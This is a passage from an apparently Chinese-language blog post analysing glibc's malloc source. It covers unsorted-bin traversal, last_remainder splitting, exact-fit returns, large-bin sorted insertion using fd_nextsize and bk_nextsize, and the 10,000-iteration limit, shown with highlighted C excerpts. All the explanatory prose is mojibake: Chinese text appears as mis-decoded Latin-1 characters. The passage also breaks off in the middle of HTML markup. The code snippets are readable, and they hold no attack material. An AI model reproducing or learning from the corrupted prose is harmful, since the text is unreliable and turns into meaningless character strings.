·å­å°±æµªè´¹äº†å¾ˆå¤§çš„ä¸€å—å†…å­˜ã€‚</p><p>é‚£ä¹ˆè¿™ä¸ªä¼šä¸ä¼šæœ‰å¤šæ­¤ä¸€ä¸¾çš„æ—¶å€™å‘¢ï¼Œä¹Ÿæ˜¯ä¼šçš„ï¼Œè¿˜æ˜¯åˆšåˆšé‚£ç§æƒ…å†µï¼Œå‡å¦‚æˆ‘ç”³è¯·<code>0x500</code>çš„<code>chunk</code>ã€‚è¿™æ ·å­åˆå¹¶ä¹‹ååˆä¼šè¢«åˆ‡å‰²ï¼Œé‚£ä¹ˆè¿™æ ·å­ï¼Œä¹‹å‰çš„åˆå¹¶å°±æ˜¾å¾—å¤šæ¬¡ä¸€ä¸¾äº†ï¼Œä½†æ˜¯å®ƒåªæ˜¯æµªè´¹äº†ä¸€éƒ¨åˆ†æ—¶é—´å¼€é”€ï¼Œå†…å­˜åˆ†é…ä¸Šè¿˜æ˜¯æ‰§è¡Œä¸Šé¢çš„é€»è¾‘æ¯”è¾ƒå ä¼˜åŠ¿ã€‚æ‰€ä»¥è¿™ä¸€æ­¥å¯ä»¥ç†è§£ä¸ºç©ºé—´ä¸Šçš„ä¼˜åŒ–ï¼Œä½†æ˜¯ç‰ºç‰²äº†å°éƒ¨åˆ†æ—¶é—´ã€‚çœ‹ä¸æ¥çš„è¯å¯ä»¥å¤šçœ‹çœ‹ä¸Šé¢ä¸¾å¾—ä¾‹å­ã€‚</p><h3 id="ç¬¬äº”æ®µï¼šlarge-binå’Œunsorted-binçš„ç›¸çˆ±ç›¸æ€"><a href="#ç¬¬äº”æ®µï¼šlarge-binå’Œunsorted-binçš„ç›¸çˆ±ç›¸æ€" class="headerlink" title="ç¬¬äº”æ®µï¼šlarge binå’Œunsorted binçš„ç›¸çˆ±ç›¸æ€"></a>ç¬¬äº”æ®µï¼šlarge binå’Œunsorted binçš„ç›¸çˆ±ç›¸æ€</h3><p>è¿™é‡Œå¼€å§‹é€»è¾‘éƒ½æ··åˆèµ·æ¥äº†ï¼Œä¸ä»…æœ‰<code>large bin</code>ï¼Œunsorted binï¼Œåˆ‡å‰²<code>top_chunk</code>ï¼Œè¿˜æœ‰ç³»ç»Ÿè°ƒç”¨é‡æ–°åˆ†é…<code>top_chunk</code>ã€‚</p><h4 id="ç¬¬1å°å—"><a href="#ç¬¬1å°å—" class="headerlink" title="ç¬¬1å°å—"></a>ç¬¬1å°å—</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">           ......</span><br><span class="line">         &#125;</span><br><span class="line">    ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå¤–é¢å¥—äº†ä¸€ä¸ª<code>while(1)</code>ï¼Œç„¶åé‡Œé¢æœ‰ä¸€ä¸ª<code>while</code>å¾ªç¯ï¼Œåˆ¤æ–­å†…å®¹å°±æ˜¯å–å¾—æœ€åä¸€ä¸ª<code>unsorted chunk</code>æ˜¯å¦ä¸è¿™ä¸ª<code>bin</code>ç›¸ç­‰ï¼Œè¿™é‡Œå¤§æ¦‚å°±æ˜¯å¼€å§‹éå†<code>unsorted chunk</code>äº†ã€‚</p><p>ç„¶åè¿™é‡Œåˆæœ‰ä¸€ä¸ª<code>check</code>ã€‚<code>victim-&gt;size &lt;= 2 * SIZE_SZ</code>å°±æ˜¯è¯´<code>chunk</code>çš„<code>size</code>å°äºç­‰äº<code>0x10</code>ï¼Œ<code>victim-&gt;size &gt; av-&gt;system_mem</code>å°±æ˜¯è¯´æˆ‘ä¸€ä¸ªå—çš„<code>size</code>å±…ç„¶æ¯”æˆ‘ç³»ç»Ÿè°ƒç”¨ç”³è¯·æ¥çš„å†…å­˜éƒ½å¤šï¼Œé‚£è¿™è‚¯å®šä¸åˆç†å•Šï¼Œæ‰€ä»¥ä»»æ„æ»¡è¶³ä¸€ä¸ªå°±ä¼šæŠ¥é”™äº†ã€‚</p><h4 id="ç¬¬äºŒå°å—"><a href="#ç¬¬äºŒå°å—" class="headerlink" title="ç¬¬äºŒå°å—"></a>ç¬¬äºŒå°å—</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">    av-&gt;last_remainder = remainder;</span><br><span class="line">    remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">    &#123;</span><br><span class="line">        remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">    set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰å››ä¸ªæ¡ä»¶ï¼š</p><ol><li><code>in_smallbin_range (nb)</code>ï¼šç”³è¯·<code>small bin</code>èŒƒå›´å†…çš„<code>chunk</code></li><li><code>bck == unsorted_chunks (av)</code>ï¼š<code>bck=victim-&gt;bk=unsorted_chunks(av)-&gt;bk-&gt;bk</code>ï¼Œä¹Ÿå°±æ˜¯è¯´<code>unsorted_chunks (av)-&gt;bk-&gt;bk=unsorted_chunks (av)</code>ï¼Œç¿»è¯‘ä¸€ä¸‹å·®ä¸å¤šå°±æ˜¯<code>unsorted binä¸­</code>åªæœ‰ä¸€ä¸ª<code>chunk</code>ã€‚</li><li><code>victim == av-&gt;last_remainder</code>ï¼šå°±æ˜¯è¯´è¿™ä¸ªchunkåˆšå¥½æ˜¯æœ€è¿‘è¢«åˆ†å‰²è¿‡çš„å‰©ä½™éƒ¨åˆ†ã€‚</li><li><code>(unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))</code>ï¼šä¿è¯æˆ‘æ‰¾åˆ°çš„è¿™ä¸ª<code>chunksize</code> &gt; éœ€è¦çš„æœ€å°å—+<code>MINSIZE</code>ã€‚ä¸ºäº†ä¿è¯ç­‰ä¼šæˆ‘åˆ‡å‰²å‡º<code>nb size</code>ä¹‹åå‰©ä½™çš„<code>chunk</code>èƒ½&gt;<code>MINSIZE</code>ï¼Œè¿™é‡Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸èƒ½ç­‰äºï¼Œå¯èƒ½è§£è¯»å“ªé‡Œæœ‰è¯¯å§ï¼Œå¦‚æœæ‚¨çŸ¥é“è¯·å¸®æˆ‘å‹˜è¯¯ä¸€ä¸‹ï¼Œè°¢è°¢äº†ã€‚</li></ol><p>ç„¶åæ¥ä¸‹æ¥å°±æ˜¯åˆ‡å‰²<code>victim</code>ï¼Œåˆ‡å‰²å‡ºä¸€å—åˆšåˆšå¥½å¤§å°çš„<code>chunk</code>ç»™ç”¨æˆ·ï¼Œåˆ‡å‰²å‡ºæ¥çš„<code>chunk</code>ä½œä¸ºæ–°çš„<code>av-&gt;last_remainder</code>ï¼Œæ³¨æ„å¦‚æœåˆ‡å‰²å‰©ä½™çš„<code>chunk size</code>ä¸ç¬¦åˆ<code>small bin</code>çš„å¤§å°ï¼Œåˆ™<code>fd_nextsize</code>å’Œ<code>bk_nextisze</code>ä¼šè¢«æ¸…ç©ºï¼Œå› ä¸ºå‰©ä½™çš„çš„<code>chunk</code>ä¼šè¢«æ”¾åˆ°<code>unsorted bin</code>å½“ä¸­ã€‚</p><p>ç„¶åè®¾ç½®<code>victim</code>çš„<code>size</code>ä¸º<code>nb|PREV_INUSE</code>ï¼Œç„¶ååˆ¤æ–­æ˜¯å¦ä¸ºä¸»åˆ†é…åŠ ä¸Šæ ‡è®°ã€‚</p><p>ç„¶åæŠŠremainderçš„<code>prev_inuse</code>ä½è®¾ç½®ä¸º1ï¼Œå› ä¸ºå‰ä¸€ä¸ªå—å·²ç»è¢«æ‹¿èµ°ä½¿ç”¨äº†ï¼Œæ‰€ä»¥è¿™ä¸ª<code>prev_inuse</code>è¦è®¾ç½®ä¸º1ã€‚</p><p>ç„¶åå› ä¸º<code>remainder</code>çš„<code>size</code>å‘ç”Ÿäº†æ”¹è¡¨ï¼Œæ‰€ä»¥ä¸‹ä¸€ä¸ª<code>chunk</code>çš„<code>prev_size</code>ä¹Ÿè¦ç›¸åº”åœ°æ”¹å˜ã€‚</p><p>å‰©ä¸‹çš„å‰é¢ç±»ä¼¼çš„éƒ½è®²è¿‡å°±ä¸èµ˜è¿°äº†ã€‚</p><h4 id="ç¬¬ä¸‰å°å—"><a href="#ç¬¬ä¸‰å°å—" class="headerlink" title="ç¬¬ä¸‰å°å—"></a>ç¬¬ä¸‰å°å—</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size == nb)</span><br><span class="line">&#123;</span><br><span class="line">    set_inuse_bit_at_offset (victim, size);</span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">&#123;</span><br><span class="line">    victim_index = smallbin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦åˆ™ä¼šå…ˆå–å‡ºè¿™æœ€åä¸€ä¸ª<code>chunk</code>ï¼ŒæŠŠå®ƒç§»é™¤<code>unsorted bin</code>ã€‚å¦‚æœå–å‡ºçš„è¿™ä¸ª<code>size</code>åˆšå¥½ç­‰äºè¿™ä¸ª<code>nb</code>ï¼Œé‚£å°±è¯´æ˜è¿™ä¸ªå—ä¸€å®šæ˜¯æœ€åˆé€‚çš„ï¼Œç›´æ¥æŠŠå®ƒè¿”å›äº†ï¼Œä¸è¦è¿Ÿç–‘ã€‚å¦‚æœå¹¶ä¸æ˜¯æœ€åˆé€‚å‘¢ï¼Œé‚£ä¹ˆå…ˆä¼šåˆ¤æ–­ä¸€ä¸‹å®ƒæ˜¯å¦å±äº<code>small bin</code>ï¼Œå±äºåˆ™æ‰§è¡Œä»¥ä¸‹çš„é€»è¾‘ï¼ŒæŠŠ<code>bck</code>å¯¹åº”<code>bin</code>çš„<code>bk</code>ï¼Œ<code>fwd</code>ä¸ºå¯¹åº”<code>bin</code>çš„<code>fd</code>ï¼Œä¹Ÿå°±æ˜¯æ‰¾åˆ°é‚£ä¸€å¯¹<code>bin</code>ï¼Œ<code>fwd</code>åœ¨å‰ï¼Œ<code>bck</code>åœ¨åã€‚å°±æ²¡äº†ï¼Œé¢„è®¡ç­‰ä¼šå°±è¦ç”¨è¿™äº›æŒ‡é’ˆæŠŠ<code>chunk</code>é“¾è¿›å»äº†ã€‚</p><h4 id="ç¬¬å››å°å—"><a href="#ç¬¬å››å°å—" class="headerlink" title="ç¬¬å››å°å—"></a>ç¬¬å››å°å—</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">        size |= PREV_INUSE;</span><br><span class="line">        <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">        assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">        &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">            &#123;</span><br><span class="line">                fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">                <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸æ˜¯<code>small bin</code>ï¼Œé‚£å°±å¾—è¿›<code>large bin</code>äº†ï¼Œè¦è¿›<code>large bin</code>ã€‚è¿™é‡Œè¦çŸ¥é“ï¼Œ<code>large bin</code>å¯æ˜¯æ‰€æœ‰<code>bin</code>å½“ä¸­æœ€å¤æ‚çš„<code>bin</code>äº†ï¼Œä¸€ä¸ª<code>chunk</code>å››ä¸ªæŒ‡é’ˆï¼Œä¸€å¯¹<code>bin</code>ç®¡ç†ä¸€ä¸ªäºŒç»´åŒå‘é“¾è¡¨ï¼Œ<code>fd</code>,<code>bk</code>æŒ‡é’ˆä¸ç›¸åŒå¤§å°çš„<code>chunk</code>è¿æ¥ï¼Œ<code>fd_nextsize</code>å’Œ<code>bk_nextsize</code>ä¸ä¸åŒå¤§å°çš„<code>chunk</code>è¿æ¥ã€‚</p><p>ç„¶åå‘¢ï¼Œè™½ç„¶<code>fd</code>å’Œ<code>bk</code>æ˜¯è¿æ¥ç›¸åŒå¤§å°çš„<code>chunk</code>ï¼Œä½†æ˜¯é‚£ä¸€å¯¹binè¿˜æ˜¯ç›¸å½“äºæ˜¯<code>fd</code>å’Œ<code>bk</code>å­—æ®µã€‚é™¤äº†è¡¨å¤´ä»¥å¤–ï¼Œå…¶ä½™çš„ä¸åŒå¤§å°çš„chunkéƒ½æ˜¯é <code>fd_nextsize</code>å’Œ<code>bk_nextsize</code>çš„ã€‚å¹¶ä¸”æ²¿ç€<code>bk_nextsize</code>ï¼Œ<code>chunksize</code>é€’å¢ã€‚ä¹Ÿå°±æ˜¯è¯´<code>av-&gt;bin[index]-&gt;bk</code>æ˜¯ç¬¬ä¸€ä¸ª<code>chunk</code>ï¼Œå¹¶ä¸”<code>size</code> æœ€å°ï¼Œç„¶åé€šè¿‡<code>bk_nextsize</code>å­—æ®µä¸€ç›´è¿æ¥åˆ°<code>av-&gt;bin[index]-&gt;fd</code>ï¼Œåå‘åŒç†ã€‚è¿˜æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ï¼š<code>large bin</code>æ‰€åœ¨çš„<code>chunk</code>å¹¶ä¸ä¸<code>chunk</code>åŒå‘è¿æ¥ã€‚</p><p>è¿™é‡Œç»™å‡ºä¸€å¼ <code>large bin</code>çš„ç»“æ„å›¾ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½å¸®åŠ©ç†è§£ä¸€ä¸‹</p><p><img src="/2022/01/27/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/2.png" alt="2"></p><p>é‚£ä¹ˆè¿™é‡Œçš„<code>bck</code>æŒ‡çš„æ˜¯<code>bin</code>æ‰€åœ¨çš„<code>chunk</code>ï¼Œ<code>fwd</code>æŒ‡çš„æ˜¯æœ€å¤§çš„è¿™ä¸ª<code>chunk</code>ã€‚</p><p><code>bck-&gt;bk</code>æŒ‡çš„å°±æ˜¯å›¾ä¸Šçš„nå·<code>chunk</code>ï¼Œä¹Ÿæ˜¯è¿™ä¸ª<code>large bin</code>ä¸­æœ€å°çš„é‚£ä¸ª<code>chunk</code>ï¼Œå¦‚æœæ‹¿å‡ºæ¥çš„<code>unsorted bin</code>å®ƒæ¯”æœ€å°çš„<code>chunk</code>è¿˜è¦å°ï¼Œé‚£å°±å·²ç»å¯ä»¥ç¡®å®šæ’å…¥åœ¨å“ªäº†ï¼Œå°±ä¸ç”¨åšä¸‹é¢çš„å¾ªç¯å†çœ‹çœ‹å®ƒåœ¨å“ªäº†ã€‚ç„¶åå°±æ˜¯ä¸€ä¸ªé“¾è¡¨çš„æ’å…¥æ“ä½œï¼Œè¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œ<code>bin</code>æ‰€åœ¨çš„<code>chunk</code>åªæœ‰<code>fd</code>å’ŒbkæŒ‡é’ˆï¼Œè€Œå…¶å®ƒ<code>chunk</code>éƒ½æ˜¯<code>fd_nextsize</code>å’Œ<code>bk_nextsize</code>è¿æ¥çš„ã€‚æˆ‘ä»¬åªéœ€è¦å…ˆåœ¨æœ€å¤§å—å’Œæœ€å°å—ä¹‹é—´æ’å…¥ï¼Œç„¶åæŠŠ<code>bin-&gt;bk</code>æŒ‡å‘<code>victim</code>å³å¯ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å¤§æ¦‚è‡ªå·±å†™ä¸€ä¸‹æ“ä½œçœ‹çœ‹ä¸æºç æ˜¯å¦ä¸€è‡´ã€‚é¦–å…ˆä¸è€ƒè™‘binï¼Œåªè€ƒè™‘é“¾è¡¨çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å…ˆæ‰¾åˆ°æœ€å¤§å—å’Œæœ€å°å—ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fwd=bin-&gt;fd;</span><br><span class="line">bck=bin-&gt;bk;</span><br><span class="line">victim-&gt;bk_nextsize=bck;</span><br><span class="line">victim-&gt;fd_nextsize=fwd;</span><br><span class="line">fwd-&gt;bk_nextsize=bck-&gt;fd_nextsize=victim;</span><br></pre></td></tr></table></figure><p>è·Ÿä¸Šé¢å¤§è‡´ä¸€æ ·ï¼Œåªä¸è¿‡å®ƒè¿™é‡Œ<code>fwd</code>çš„å€¼æ˜¯é‚£ä¸ª<code>large bin</code>çš„<code>chunk</code>ï¼Œç›´æ¥é€šè¿‡<code>fd</code>æŒ‡é’ˆä¹Ÿèƒ½ç›´æ¥æ‰¾åˆ°æœ€å¤§çš„<code>chunk</code>ã€‚æ‰€ä»¥æˆ‘åé¢çš„ä¸»è¦ä»£ç åº”è¯¥æŠŠ<code>fwd</code>æ”¹æˆ<code>fwd-&gt;fd</code>å°±è·Ÿä¸Šé¢ä¸€æ¨¡ä¸€æ ·äº†ã€‚</p><p>å¦‚æœä¸æ˜¯ï¼Œé‚£å°±æ¥ç€å¾€<code>bk_nextsize</code>è¿™ä¸ªæŒ‡é’ˆä¸Šé¢æ‰¾ï¼Œæ‰¾åˆ°å¤§äºç­‰äºçš„<code>chunk</code>ä¸ºæ­¢ã€‚ç„¶åå¦‚æœç­‰äºï¼Œå°±åªéœ€è¦ç”¨<code>fd</code>å’Œ<code>bk</code>æŒ‡é’ˆä¸ç›¸ç­‰å¤§å°çš„<code>chunk</code>ç›¸è¿ï¼Œå¦‚æœæ²¡æœ‰ç›¸ç­‰ï¼Œå°±å¾—åœ¨<code>fd_nextsize</code>å’Œ<code>bk_nextsize</code>æ–¹å‘ä¸Šæ’å…¥ï¼Œç„¶å<code>fd</code>å’Œ<code>bk</code>éƒ½é»˜è®¤æŒ‡å‘è‡ªå·±ã€‚è¿™ä¸ªæˆ‘å°±ä¸æ¼”è¯•äº†ï¼Œè·Ÿå‰é¢é‚£ä¸ªåŸºæœ¬æ˜¯ä¸€æ ·çš„ã€‚</p><h4 id="ç¬¬äº”å°å—"><a href="#ç¬¬äº”å°å—" class="headerlink" title="ç¬¬äº”å°å—"></a>ç¬¬äº”å°å—</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line"><span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå°±å¾ˆç®€å•äº†ï¼Œå°±æ˜¯ä¸€ä¸ªæ’å…¥æ“ä½œï¼Œå‰é¢æ—¢ç„¶å·²ç»æ‰¾åˆ°äº†æ’å…¥çš„ä½ç½®ï¼Œè¿™é‡Œä¸€æ°”å‘µæˆç›´æ¥è§£å†³äº†ã€‚ç„¶åè¿™é‡Œè¿˜æœ‰ä¸€ä¸ªéå†<code>unsorted bin</code>çš„æœ€å¤§å€¼ï¼Œä¸€æ¬¡æœ€å¤šéå†<code>10000</code>ä¸ª<code>unsorted bin</code>ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥ç†è§£ï¼Œå¦‚æœæˆ‘ä¸€æ¬¡äº§ç”Ÿäº†å¾ˆå¤šçš„<code>unsorted bin</code>ï¼Œç„¶åæˆ‘ä¸€æ¬¡<code>malloc</code>ï¼Œé‚£è¾¹ä¸€ç›´åœ¨å¾ªç¯æè¿™ä¸ª<code>unsorted bin</code>ï¼Œè¿Ÿè¿Ÿå°±æ²¡åˆ†é…å†…å­˜å›æ¥æ‰€ä»¥è¿™é‡Œè®¾å®šä¸€ä¸ªæœ€å¤§å€¼ã€‚</p><p>åˆ°äº†è¿™é‡Œï¼Œå¯¹<code>unsorted bin</code>çš„éå†å°±ç»“æŸäº†ã€‚</p><h4 id="ç¬¬å…­å°å—"><a href="#ç¬¬å…­å°å—" class="headerlink" title="ç¬¬å…­å°å—"></a>ç¬¬å…­å°å—</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 